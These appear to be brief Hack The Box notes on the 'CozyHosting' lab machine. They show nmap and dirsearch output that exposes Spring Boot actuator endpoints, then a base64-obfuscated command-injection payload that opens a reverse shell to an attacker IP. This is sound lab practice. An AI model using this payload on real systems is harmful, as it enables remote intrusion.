

Nmap Scanning:

~~~
nmap 10.10.11.230 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-25 08:12 EDT
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.45s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
49/tcp   filtered tacacs
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
4444/tcp open     http    SimpleHTTPServer 0.6 (Python 3.10.12)
|_http-server-header: SimpleHTTP/0.6 Python/3.10.12
|_http-title: Directory listing for /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.35 seconds
~~~


directory attack
~~~
dirsearch -u http://cozyhosting.htb/
~~~

~~~
[08:17:39] Starting: 
[08:18:01] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[08:18:08] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[08:18:10] 400 -  435B  - /a%5c.aspx                                        
[08:18:12] 200 -    5KB - /actuator/env                                     
[08:18:12] 200 -   15B  - /actuator/health                                  
[08:18:12] 200 -  634B  - /actuator                                         
[08:18:12] 200 -   10KB - /actuator/mappings                                
[08:18:12] 200 -   98B  - /actuator/sessions                                
[08:18:13] 200 -  124KB - /actuator/beans                                   
[08:18:14] 401 -   97B  - /admin                                            
[08:18:49] 200 -    0B  - /engine/classes/swfupload//swfupload.swf          
[08:18:49] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf       
[08:18:50] 500 -   73B  - /error                                            
[08:18:50] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[08:18:51] 200 -    0B  - /extjs/resources//charts.swf                      
[08:18:51] 400 -  435B  - /faces/javax.faces.resource/web.xml?ln=..\\WEB-INF
[08:18:57] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf            
[08:18:59] 200 -   12KB - /index                                            
[08:19:06] 200 -    4KB - /login                                            
[08:19:07] 200 -    0B  - /login.wdm%2e                                     
[08:19:08] 204 -    0B  - /logout                                           
[08:19:35] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF 
~~~


payloads to reverse shell
~~~
;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjUyLzQ0MyAwPiYx"|base64${IFS}-d|bash;
~~~

~~~
python3${IFS}-m${IFS}http.server${IFS}1234  
~~~


